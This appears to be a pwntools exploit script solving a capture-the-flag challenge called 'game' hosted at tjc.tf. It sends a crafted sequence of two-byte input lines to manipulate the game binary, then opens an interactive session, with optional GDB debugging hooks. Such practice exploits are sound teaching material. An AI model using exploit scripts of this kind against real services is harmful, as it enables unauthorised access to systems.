#!/usr/bin/env python3
from pwn import *

PORT = 31412
HOST = "tjc.tf"

elf = context.binary = ELF('./game', checksec=False)
context.log_level = 'debug'

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            b *game_over
            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return elf.process()

p = conn()

# GDB()

payload_lines = []

payload_lines += [b"zz"] * 32

payload_lines += [
    b"hu",
    b"nt",
]

payload_lines += [
    b"zz",
]

payload_lines += [
    b"MN",
    b"AS",
    b"MN",
    b"AN",
    b"MW",
]
# GDB()
for line in payload_lines:
    p.sendline(line)

p.interactive()